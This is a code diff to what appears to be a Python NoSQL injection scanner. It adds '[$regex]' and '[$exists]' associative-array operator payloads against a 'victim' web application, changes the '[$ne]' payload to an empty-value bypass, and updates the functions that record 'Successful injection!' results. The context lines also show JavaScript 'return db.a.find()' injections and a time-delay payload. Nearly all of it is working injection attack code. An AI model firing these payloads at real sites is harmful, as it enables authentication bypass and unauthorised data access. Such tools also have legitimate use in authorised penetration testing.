@@ -363,6 +363,40 @@ def getApps(webPort, victim, uri, https, verb, requestHeaders, args=None):
             checkResult(randLength, injLen, testNum, verb, None)
             testNum += 1
 
+        print("\n")
+        if verb == "ON":
+            print("Testing PHP/ExpressJS [$regex] associative array injection...")
+            print("Injecting " + uriArray[19])
+        else:
+            print("Test 9: PHP/ExpressJS [$regex] associative array injection")
+
+        req = urllib.request.Request(uriArray[19], None, requestHeaders)
+        errorCheck = errorTest(getResponseBodyHandlingErrors(req), testNum, 19)
+
+        if errorCheck == False:
+            injLen = int(len(getResponseBodyHandlingErrors(req)))
+            checkResult(randLength, injLen, testNum, verb, None, 19)
+            testNum += 1
+        else:
+            testNum += 1
+
+        print("\n")
+        if verb == "ON":
+            print("Testing PHP/ExpressJS [$exists] associative array injection...")
+            print("Injecting " + uriArray[20])
+        else:
+            print("Test 10: PHP/ExpressJS [$exists] associative array injection")
+
+        req = urllib.request.Request(uriArray[20], None, requestHeaders)
+        errorCheck = errorTest(getResponseBodyHandlingErrors(req), testNum, 20)
+
+        if errorCheck == False:
+            injLen = int(len(getResponseBodyHandlingErrors(req)))
+            checkResult(randLength, injLen, testNum, verb, None, 20)
+            testNum += 1
+        else:
+            testNum += 1
+
         if args == None:
             doTimeAttack = input("Start timing based tests (y/n)? ")
         else:
@@ -905,7 +939,7 @@ def postApps(victim, webPort, uri, https, verb, postData, requestHeaders, args=N
     return ()
 
 
-def errorTest(errorCheck, testNum):
+def errorTest(errorCheck, testNum, uriIndex=None):
     global possAddrs
     global httpMethod
     global neDict
@@ -920,7 +954,7 @@ def errorTest(errorCheck, testNum):
         print("Injection returned a MongoDB Error.  Injection may be possible.")
 
         if httpMethod == "GET":
-            possAddrs.append(uriArray[testNum])
+            possAddrs.append(uriArray[uriIndex if uriIndex is not None else testNum])
             return True
 
         else:
@@ -939,7 +973,7 @@ def errorTest(errorCheck, testNum):
         return False
 
 
-def checkResult(baseSize, respSize, testNum, verb, postData):
+def checkResult(baseSize, respSize, testNum, verb, postData, uriIndex=None):
     global vulnAddrs
     global possAddrs
     global lt24
@@ -961,7 +995,7 @@ def checkResult(baseSize, respSize, testNum, verb, postData):
             print("Successful injection!")
 
         if httpMethod == "GET":
-            vulnAddrs.append(uriArray[testNum])
+            vulnAddrs.append(uriArray[uriIndex if uriIndex is not None else testNum])
         else:
             if testNum == 1:
                 vulnAddrs.append(str(neDict))
@@ -991,7 +1025,7 @@ def checkResult(baseSize, respSize, testNum, verb, postData):
             print("Possible injection.")
 
         if httpMethod == "GET":
-            possAddrs.append(uriArray[testNum])
+            possAddrs.append(uriArray[uriIndex if uriIndex is not None else testNum])
         else:
             if testNum == 1:
                 possAddrs.append(str(neDict))
@@ -1016,7 +1050,7 @@ def checkResult(baseSize, respSize, testNum, verb, postData):
         else:
             print("Possible injection.")
         if httpMethod == "GET":
-            possAddrs.append(uriArray[testNum])
+            possAddrs.append(uriArray[uriIndex if uriIndex is not None else testNum])
         else:
             if testNum == 1:
                 possAddrs.append(str(neDict))
@@ -1068,27 +1102,7 @@ def buildUri(origUri, randValue, args=None):
     paramName = []
     paramValue = []
     global uriArray
-    uriArray = [
-        "",
-        "",
-        "",
-        "",
-        "",
-        "",
-        "",
-        "",
-        "",
-        "",
-        "",
-        "",
-        "",
-        "",
-        "",
-        "",
-        "",
-        "",
-        "",
-    ]
+    uriArray = [""] * 21
     injOpt = []
 
     # Split the string between the path and parameters, and then split each parameter
@@ -1135,7 +1149,7 @@ def buildUri(origUri, randValue, args=None):
 
         if paramName[x] in injOpt:
             uriArray[0] += paramName[x] + "=" + randValue + "&"
-            uriArray[1] += paramName[x] + "[$ne]=" + randValue + "&"
+            uriArray[1] += paramName[x] + "[$ne]=&"
             uriArray[2] += paramName[x] + "=a'; return db.a.find(); var dummy='!" + "&"
             uriArray[3] += paramName[x] + "=1; return db.a.find(); var dummy=1" + "&"
             uriArray[4] += (
@@ -1190,6 +1204,12 @@ def buildUri(origUri, randValue, args=None):
                 + "=a'; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy='!"
                 + "&"
             )
+            # Associative-array operator payloads (added for broader operator
+            # coverage): $regex, $exists. They use empty values because an
+            # empty value is the reliable bypass for these operators (a
+            # non-empty random value often matches nothing).
+            uriArray[19] += paramName[x] + "[$regex]=&"
+            uriArray[20] += paramName[x] + "[$exists]=&"
 
         else:
             uriArray[0] += paramName[x] + "=" + paramValue[x] + "&"
@@ -1211,11 +1231,13 @@ def buildUri(origUri, randValue, args=None):
             uriArray[16] += paramName[x] + "=" + paramValue[x] + "&"
             uriArray[17] += paramName[x] + "=" + paramValue[x] + "&"
             uriArray[18] += paramName[x] + "=" + paramValue[x] + "&"
+            uriArray[19] += paramName[x] + "=" + paramValue[x] + "&"
+            uriArray[20] += paramName[x] + "=" + paramValue[x] + "&"
         x += 1
 
     # Clip the extra & off the end of the URL
     x = 0
-    while x <= 18:
+    while x <= 20:
         uriArray[x] = (
             split_uri[0] + "?" + urllib.parse.quote_plus(uriArray[x][:-1])
         )
